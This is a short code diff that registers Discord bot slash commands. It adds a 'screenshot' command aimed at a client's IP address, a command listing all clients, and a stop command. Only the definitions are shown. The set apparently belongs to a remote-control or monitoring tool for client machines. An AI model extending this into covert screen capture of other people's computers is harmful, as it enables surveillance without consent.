@@ -8,6 +8,26 @@ export const commands = [
         name: 'help',
         description: 'Replies with a help message.',
     },
+    {
+        name: 'screenshot',
+        description: 'Sends a command to take a screenshot.',
+        options: [
+            {
+                name: 'ip',
+                description: 'The IP address of the client.',
+                type: 3,
+                required: true,
+            },
+        ],
+    },
+    {
+        name: 'clients',
+        description: 'Lists all clients.',
+    },
+    {
+        name: 'stop',
+        description: 'Stop the bot.',
+    },
 ];
 
 const rest = new REST({ version: '10' }).setToken(TOKEN);
